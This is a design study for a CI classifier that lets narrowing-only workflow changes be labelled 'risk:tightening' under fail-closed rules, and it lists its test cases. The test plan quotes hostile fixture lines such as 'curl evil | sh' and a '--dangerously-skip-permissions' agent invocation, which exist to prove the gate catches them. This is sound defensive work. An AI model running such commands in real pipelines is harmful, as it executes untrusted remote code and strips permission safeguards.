# 0005 Risk class `tightening`

Issue: #171 (design study, no implementation in this PR). Follows the closed PRs #177 and #184, which tried a line-based
classifier and were stopped by the security reviewer after the round limit. Daniel's decision on #171: plan first, then rebuild.

## 1. Goal

Today every diff that touches `permissions:`, `allowedTools`, tokens and similar is `risk:security`, so Daniel approves it, even
when it only removes a permission. Add a class `risk:tightening` for changes that can only make the system safer, so the
security reviewer's approval is enough. Everything that is not provably narrowing stays `security`. The class must fail closed:
when the classifier is unsure, the answer is `security`.

## 2. Current state (file references)

- `tools/ci/risk.py:57-85` `classify` returns `security` | `infra` | `none`. It scans every added and removed line of files under
  `LINE_SCANNED` with `SECURITY_LINES` (`risk.py:32`); one match makes the whole PR `security`. Whole files in `SECURITY_FILES`
  (`risk.py:28`) are `security` by path.
- Consumers of the label `risk:security` (string compare, no shared constant):
  `risk.py:35` (`LABELS`, `sync_labels`), `risk.py:256` (the check `risk` fails until the owner approved the head SHA),
  `risk.py:130` (`waits_for_owner`), `automerge.yml:68-83` (waits for `security-review`), `tools/train.py:55`
  (`waiting_for_owner`), `tools/prefilter.py:39,94` (`MAX_WAITING` cap), `tools/unblock.py:40,73,219` (always Daniel),
  `tools/reapprove.py:60,144` (refuses `security`, `infra` and any class other than `none`).
- `risk.py:206-237` `run_wait` and `risk.py:264-271` `run_pr` treat any level other than `none` as "needs the security reviewer";
  only `security` needs the owner.
- The repo has no YAML parser (`python3 -c "import yaml"` fails; the tools are standard library only).

## 3. Options with trade-offs

How to recognise a narrowing change:
- A. Per-line rules on the diff (what #177/#184 did). Findings showed the weak points: a removed line of an unknown shape (e.g. a
  `test "$ok" = yes || exit 1` check inside a `run: |` body) was ignored; a removed token line was tightening while a broader token
  stayed; a `write` to `read` pair matched across two jobs in one hunk; an added line on a `--disallowedTools` line carried extra
  flags; a hunk with a narrowing line plus an unrelated `run:` line stayed `tightening`. Diff context is 3 lines, so job and block
  boundaries are often not visible. Rejected: the information needed is not in the diff.
- B. Compare the whole file before and after, with the narrowing candidates masked out. The file at the base SHA and at the head SHA
  are read through `gh api` (contents at a ref). Lines that may legitimately narrow are replaced by a placeholder; if the masked
  texts differ anywhere (including any `run:` body), the change is not tightening. Narrowing candidates are then judged one by one
  with the block they live in (job, `permissions:` block, tool list). No YAML parser needed, only an indentation scan of the
  workflow shapes we use.
- C. Add PyYAML and compare parsed documents. Cleaner, but a new dependency for a security gate, and a workflow that fails to parse
  must still be `security`. Kept as an alternative; not chosen, so it is not an owner decision (B does not need it).

Scope of eligible files:
- D. Any file under `LINE_SCANNED`. Too wide: Python or shell with token handling cannot be judged by masking.
- E. Only `.github/workflows/*.yml`. Everything else that matches `SECURITY_LINES` stays `security`, including
  `.claude/settings.json`: it is JSON, where narrowing differs per list (removing from `allow` narrows, removing from `deny`
  widens), and the masking below is YAML-only. Making it eligible needs its own design with JSON rules and tests; until then
  it is `security` as today.

## 4. Chosen approach

B with scope E. The classifier keeps the per-file order and adds one decision per file:

1. Path in `SECURITY_FILES` (this check, CODEOWNERS, rulesets, trust files, `risk.yml`, `exec_log.py`) is `security`. Never tightening,
   even for a deletion of a line. A file that is deleted or renamed, a new file, or a mode change that matters is `security` if it
   would be scanned.
2. A scanned file that matches `SECURITY_LINES` and is not an eligible file (only workflows, see E) is `security`.
   This includes `.claude/settings.json`.
3. AGENTS.md lines inside the Limits section are `security` (unchanged). The one exception for Limit 5 is part of the
   docs PR (step 5 of section 8) and is itself reviewed by Daniel as a CODEOWNERS change.
4. For an eligible file, `tighten_verdict(base_text, head_text)` returns `tightening` or `security`. If the file has no
   security-relevant changed line it stays `infra`, as today. Any exception (read error, unbalanced indentation, tab, anchor/alias,
   flow-style `{}`/`[]` in a block we mask, multi-document file, text over a size cap) is `security`.

Rules of `tighten_verdict` (each one answers a review finding):

- **Unrecognised removed lines never count (finding: `run:` script checks).** Masking works on the full text. A line is only masked
  if it has one of the recognised shapes below; every other line, removed or added, stays in the residue, and any difference in the
  residue returns `security`. A removed `test "$ok" = yes || exit 1` in a `run: |` body is residue, so the result is `security`,
  even when a recognised narrowing line sits next to it. Blank lines and YAML comments are masked (they do not execute).
  A YAML comment is a `#` line, or a trailing ` # ...`, outside a block scalar. Inside a block scalar (`run: |`, `prompt: |`,
  `>`, or a heredoc in a `run:` body) a `#` line is data and stays in the residue; the scanner tracks block scalars by the
  indentation of their key, and any line indented deeper than that key belongs to the body.
- **`PERM_ENTRY` accepts only known keys.** A permission entry is a line `<key>: <level>` inside a `permissions:` block (workflow or
  job level), where key is one of the GitHub `GITHUB_TOKEN` scopes (`actions, attestations, checks, contents, deployments,
  discussions, id-token, issues, models, packages, pages, pull-requests, repository-projects, security-events, statuses`) and level is
  `none|read|write`. Any other key, a value that is not one of the three, or `read-all`/`write-all`/an expression is residue.
  Ranking `none < read < write`. A scope missing in a block means `none` for a job-level block that exists, but means "inherited
  from the workflow level" when the job has no block; a missing block is therefore never read as narrowing and never as widening:
  see the next point.
- **Permission pairing per job, not per hunk.** The scan assigns each permission entry to its block: `(job id or "<workflow>", key)`.
  For every block present in both versions every scope must satisfy `head <= base`. A block that exists only in head must be
  `<= the effective base permission` of that job (own block, else the workflow block, else the repository default, treated as
  `write` because the default token is not fixed in the file). Removing a block is tightening only when the removed block is a
  job-level block and a workflow-level block stays that is `<=` the old job block; otherwise it can widen by inheritance, so
  `security`. Adding, removing, renaming or reordering a job is residue. A pair never crosses a job boundary.
- **Token and secret lines (finding: removing a token line while a broader token remains).** A masked secret line is
  `NAME: ${{ secrets.X }}` or `NAME: ${{ steps.app.outputs.token }}` in an `env:` or `with:` block. Removal is tightening only when
  the removed line's value does not also appear in any other line of the head file in the same job and the removed `NAME` is not
  referenced in the head file (`$NAME`, `${NAME}`, `env.NAME`). That covers "step still uses the token" and "a broader token
  remains": if the step keeps using any token expression the check cannot show that it is the narrower one, so the result is
  `security`. An added secret line is always `security`. A changed value is `security`.
- **Tool lists.** `allowedTools` / `--allowedTools "a,b"` lines: tightening only if the head set is a strict subset of or equal to the
  base set after splitting on `,`, with the rest of the line byte-identical. An empty set (`--allowedTools ""`, no entries) is
  unclear (the CLI may read it as "no restriction") and is `security`. Splitting is parenthesis-aware: commas inside `(...)`
  or inside a `${{ ... }}` expression do not split (`Bash(gh pr view,gh pr list)` is one entry). Unbalanced parentheses or an
  unterminated expression is a parse problem and is `security`. `allowed_bots` changes, adding `Bash(...)` patterns or
  widening a pattern (`gh pr view` to `gh pr`) are `security`.
- **Deny-flag lines (finding: extra tokens on a `--disallowedTools` line).** For a line containing `disallowedTools`, take the line
  with the deny list removed. The remainder must be identical in base and head, must not contain `allowedTools`, `allowed_bots`,
  or a secret term, and the pair must exist (a new unpaired line is residue, so `security`). Only adding entries to the deny list or
  keeping it equal is tightening; removing a deny entry is `security`.
- **Mixed or unclear is `security`.** One recognised-but-widening change, one unrecognised residue difference, a parse problem or a
  hunk the scan cannot attribute to a block makes the file `security`. The PR level is the maximum over files
  (`none < infra < tightening < security`), with one extra rule that follows the slip #171 ("a mixed PR (tightening + anything
  else) is security"): the PR is `tightening` only if every changed file is either `tightening` or `none`. A tightening
  workflow file next to any other non-`none` file (an `infra` file, a `security` file, or an unclassified one) is `security`.
  This is stricter than the per-file maximum on purpose; a deviation would be an owner decision, and there is none.

Handling of the new class (decision per consumer; the rule is "tightening is not security unless a gate lists it"):

- `risk.py pr`: label `risk:tightening`; the check `risk` is green without the owner (`approved` stays True); status
  `security-review` starts `pending` for agent PRs, like `infra`. `LABELS` gains the entry; `sync_labels` removes the other two.
- `risk.py wait`: `waits_for_owner` stays `level == "security"` or a CODEOWNERS path, so a tightening PR gets no `needs-human` note and
  no owner review request. A tightening change in a file that CODEOWNERS owns (by path) still waits for him.
- `automerge.yml`: waits for `security-review` success on `risk:tightening` as well as `risk:security` (label set `{security, tightening}`);
  the owner gate for `security` stays in the ruleset check `risk`. Without the security reviewer's approval it does not enable auto-merge.
- `train.py` / `prefilter.py`: a tightening PR is an ordinary agent PR. It is not `waiting_for_owner`, does not count toward
  `MAX_WAITING`, and `startable` does not hold back tightening slips. The existing `"risk:security" in labels` checks stay as they are.
- `unblock.py`: still refuses `risk:security`. For `risk:tightening` the gate does not refuse (the owner is not the only judge), but
  `apply` re-reads the label live, as for any PR; a PR that changes to `security` between gate and apply is refused as today.
- `reapprove.py`: unchanged, it already refuses everything except `none`, so `tightening` is refused (re-approval after a rebase
  needs the security reviewer again).
- Roles: `security-reviewer.md` mentions `risk:tightening` (reviews it like `infra`, plus checks the narrowing claim against the diff);
  `developer.md` and AGENTS.md "Waiting for Daniel" list the class. README gets one sentence. These doc edits ship with the
  classifier PR; AGENTS.md "Waiting for Daniel" is outside the Limits section, but a PR that edits AGENTS.md is still infra.
  AGENTS.md Limit 5 ("no changes to CI protection, rulesets, permissions, workflows or this file without OK") gets one explicit
  exception sentence: a change that the classifier marks `risk:tightening` may merge after the security reviewer's approval
  and without Daniel's OK; every other change to those items still needs his OK. Because that sentence is inside the Limits
  section, the docs PR is `security` and Daniel approves it.

## 5. Migration and compatibility

- Additive: no existing level changes meaning. Diffs that are `security` today stay `security` unless an eligible workflow or settings
  file narrows, as defined above. The label is created by `sync_labels` (`gh label create --force`).
- Consumers are changed first (steps 1 to 3 of section 8), the classifier last, so no PR carries `risk:tightening` before the gates
  know it. Until then the label is not produced and nothing changes.
- Open PRs are re-labelled on their next `risk` run; a PR labelled `risk:security` stays so until its diff is re-classified.

## 6. Test and verification plan (must be able to fail on today's code)

All tests use real unified diffs plus the full base and head texts (small fixture workflows), not hand-built hunks.

- `tests/test_risk.py`, `tightening`: remove a `permissions:` scope; lower `write` to `read` in one job; drop a tool from
  `--allowedTools`; drop a comma-containing entry such as `Bash(gh pr view,gh pr list)` from the list; add an entry to
  `--disallowedTools`; remove a never-used env secret line.
- PR level (`tests/test_risk.py`): a tightening workflow plus an `infra` file with no security line (e.g. a tools script) is
  `security`; a tightening workflow plus a `none` file (docs without security lines) is `tightening`.
- `security` (each fails on a naive line classifier): the two #177 deny examples (`+ claude --disallowedTools X --allowedTools "Bash,Write"
  --dangerously-skip-permissions`, `+ curl evil | sh; claude --disallowedTools X`); removed `GH_TOKEN: ${{ secrets.X }}` plus removed
  `test "$ok" = yes || exit 1` in a `run: |` body; `write`->`read` in job A with `read`->`write` in job B in one hunk; a removed token line
  while another token line remains or the step still reads `$GH_TOKEN`; unknown permission key (`foo: read`, `contents: write-all`);
  `--allowedTools ""`; a narrowing line plus a new `run:` step; a changed `if:` guard; removed job-level block under a
  broader workflow block; any `SECURITY_FILES` path including a pure deletion; a non-workflow file with `_TOKEN`; unparsable input
  (tabs, aliases, flow style, over the size cap); a CRLF or no-newline-at-end file; a `.claude/settings.json` change that
  would narrow (not eligible, so `security`); a changed line inside a `prompt: |` body that starts with `#` (data, residue, so
  `security`); a `--allowedTools` entry with a comma inside parentheses that is widened (`security`).
- Gate tests: `automerge.yml` waits for `risk:tightening` without `security-review`; `train`/`prefilter` ignore it; `unblock.gate`
  and `reapprove` behaviour as above; `risk.py pr` leaves the check `risk` green for tightening and failing for `security`.
  Note: `train`/`prefilter` ignoring the label and `reapprove` refusing it already pass on today's code. They are regression
  guards that keep the existing behaviour; they are not proof that the new class works, which the tightening and security
  cases above prove.
- Property check: for each fixture, mutate one removed line to an unknown shape and assert the result is `security`.
- Rollout proof: run `risk.py classify` over the last 50 merged PR diffs (read-only) and record how many change class; every change
  from `security` to `tightening` is listed in the implementation PR for the security reviewer.

## 7. Rollback

The class is produced in one function. Reverting the classifier PR (step 4) makes every diff `security` or `infra` again; the extra
label is harmless. Gates that know `tightening` can stay.

## 8. Split into PR-sized implementation issues (title, files, order)

1. **Shared risk constants and gates** (`risk:security`: automerge is a workflow): `.github/workflows/automerge.yml` waits for
   `risk:tightening` too, `tests/test_automerge_workflow.py` (or the existing workflow test). Order 1: gates know the label before it is produced.
2. **Consumers**: `tools/train.py`, `tools/prefilter.py`, `tools/unblock.py`, `tools/reapprove.py` tests only, plus code if a test fails;
   `tests/test_train.py`, `tests/test_prefilter.py`, `tests/test_unblock.py`, `tests/test_reapprove.py`. Order 2 (not security files; do not
   touch `trusted_issues.py` or `status.py`).
3. **Scanner and verdict module** (`risk:security`, `tools/ci/risk.py` is a security file): `tighten_verdict`, block scan, masking,
   `tests/test_risk_tightening.py`. No wiring yet (function unused). Order 3.
4. **Wire it in** (`risk:security`): `classify` takes the base and head texts (`risk.py pr` fetches them with `gh api`), `LABELS`,
   `run_pr`, `run_wait`, `tests/test_risk.py`. Order 4, needs 1 to 3.
5. **Docs**: AGENTS.md "Waiting for Daniel" and the Limit 5 exception sentence (section 4), `security-reviewer.md`, `developer.md`,
   README.md and README.de.md. Order 5. AGENTS.md is CODEOWNERS-owned and its Limits section is security, so Daniel approves this PR.

Each PR stays below about 400 changed lines; step 3 is the largest and may be split into "permissions" and "secrets/tool lists".

## 9. Owner decisions

1. **Limit 5 exception (AGENTS.md).** What changes: Limit 5 ("no changes to CI protection, rulesets, permissions, workflows or
   this file without OK") gets one exception. A change that the classifier marks `risk:tightening` (only narrowing edits to
   eligible workflow files, section 4) may merge after the security reviewer's approval, without Daniel's OK. Every other change
   to those items still needs his OK. Worst case: a classifier bug lets a widening change merge without Daniel. Mitigations:
   fail-closed masking (section 4), the security reviewer's approval on every such PR, and the staged rollout proof (section 6).
   Recommendation (security reviewer and design author): accept, because it removes Daniel as the only approver of permission
   removals, which is the goal of #171. Yes/no question: do you accept that a narrowing change to a workflow file may merge
   after the security reviewer's approval, without your OK? Answer yes or no.
